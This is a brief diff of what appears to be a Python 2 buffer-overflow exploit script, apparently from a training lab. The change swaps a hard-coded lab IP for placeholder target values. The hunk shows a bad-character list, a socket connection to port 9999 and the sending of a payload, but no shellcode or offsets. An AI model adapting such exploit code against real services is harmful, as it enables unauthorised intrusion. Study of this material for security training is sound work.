@@ -15,7 +15,7 @@ badchar = [0x00]
 
 try:
 	print "Sending pattern.."
-	s.connect(("10.11.25.156",9999))
+	s.connect(("targetip",targetport))
 	data = s.recv(1024)
 	s.send(Payload+'\r\n')
 	print "\nDone!."
